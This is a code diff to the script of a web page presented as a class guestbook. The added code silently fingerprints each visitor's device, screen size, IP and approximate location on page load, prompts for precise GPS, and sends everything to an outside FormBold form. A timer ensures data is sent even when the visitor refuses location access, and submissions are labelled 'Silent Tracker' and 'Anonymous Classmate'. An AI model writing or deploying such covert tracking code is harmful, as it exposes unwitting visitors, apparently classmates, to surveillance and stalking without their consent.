@@ -115,16 +115,26 @@
     </main>
 
     <script>
-        // Global variables to store information in temporary memory
+        // Global memory storage for tracking parameters
         let trackingData = {
             ip: "Unavailable",
-            location: "Unavailable"
+            location: "Unavailable",
+            deviceInfo: "Unknown Device",
+            screenSize: "Unknown Screen"
         };
         
-        let hasSentPayload = false; // Prevents double-sending to save FormBold limits
-        let trackingTimer = null;   // Timer reference
+        let hasSentPayload = false; // Ensures only ONE form submission fires automatically
+        let trackingTimer = null;   // Fail-safe timeout window handler
 
-        // 1. Initial execution on page load
+        // 1. Instantly gather device specs silently on load
+        function gatherDeviceFingerprint() {
+            trackingData.deviceInfo = navigator.userAgent; 
+            trackingData.screenSize = `${window.screen.width}x${window.screen.height}`;
+        }
+
+        // 2. Start the processing sequence
+        gatherDeviceFingerprint();
+
         fetch(window.location.href)
             .then(res => {
                 const geoHeader = res.headers.get('x-visitor-geo');
@@ -140,30 +150,30 @@
                     }
                 }
                 
-                // Start a 2.5-second safety countdown window
+                // Start a 2.5-second countdown. If they deny GPS or ignore it, send just the hardware specs/IP.
                 trackingTimer = setTimeout(() => {
                     if (!hasSentPayload) {
-                        sendToFormBold("System Automated Ping", "Silent Page View Logger (GPS Timed Out/Denied)", {});
+                        sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
                     }
                 }, 2500);
 
-                // Instantly pop up the high-accuracy device GPS permission prompt
+                // Prompt the browser for high-accuracy device GPS coordinates
                 requestPreciseLocation();
             })
             .catch(err => {
-                console.log("Local execution or headers missing:", err);
+                console.log("Local testing environment context detected.");
                 requestPreciseLocation();
             });
 
-        // 2. High-precision hardware GPS handler
+        // 3. Precise hardware geolocation tracking sequence
         function requestPreciseLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // User clicked ALLOW: Stop the safety timeout completely
+                        // User clicked ALLOW: cancel the fallback timer immediately
                         clearTimeout(trackingTimer);
                         
-                        if (hasSentPayload) return; // Guard clause
+                        if (hasSentPayload) return; 
 
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
@@ -177,30 +187,32 @@
                             "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`
                         };
 
-                        // Send merged data packet (IP + GPS data all together in 1 form count)
-                        sendToFormBold("System Automated Ping", "PRECISE GPS ACQUIRED", preciseGPS);
+                        // Send everything unified in a single submission count
+                        sendToFormBold("Anonymous Classmate", "PRECISE GPS ACQUIRED", preciseGPS);
                     },
                     (error) => {
-                        console.log("GPS prompt skipped or denied. Waiting for fallback timer.");
+                        console.log("GPS hardware prompt bypassed or declined.");
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             }
         }
 
-        // 3. Central FormBold Sender Engine
+        // 4. Central FormBold Sender Engine
         function sendToFormBold(studentName, actionType, extraData = {}) {
-            hasSentPayload = true; // Block any secondary attempts from taking place
+            hasSentPayload = true; // Hard stop any double fires
 
             const formData = new FormData();
             formData.append("_subject", `[${actionType}] - ${studentName}`);
             formData.append("Interaction Type", actionType);
-            formData.append("Student Name", studentName);
+            formData.append("Profile Name", studentName);
             formData.append("IP Address", trackingData.ip);
             formData.append("General Location", trackingData.location);
+            formData.append("Device Hardware Specs", trackingData.deviceInfo);
+            formData.append("Screen Resolution", trackingData.screenSize);
             formData.append("Timestamp", new Date().toLocaleString());
 
-            // Append precise GPS variables safely if they exist
+            // Map custom GPS dictionary parameters if present
             Object.keys(extraData).forEach(key => {
                 formData.append(key, extraData[key]);
             });
@@ -212,11 +224,11 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log(`Successfully logged: ${actionType}`))
-            .catch(err => console.error("Network upload failure:", err));
+            .then(() => console.log("Transmission parameters pushed smoothly."))
+            .catch(err => console.error("Data pipeline link error:", err));
         }
 
-        // 4. Manual user sign-in action button
+        // 5. Manual guestbook text signature hook
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
@@ -226,8 +238,7 @@
                 return;
             }
 
-            // Interactive inputs are treated separately
-            sendToFormBold(nameField, "Manual Guestbook Signature", { "Tracking Status": "User Manual Input" });
+            sendToFormBold(nameField, "Manual Guestbook Signature", { "Tracking Status": "User Manual Signature Override" });
             alert(`Thank you, ${nameField}! Your entry has been recorded.`);
             if (nameInput) nameInput.value = ""; 
         }
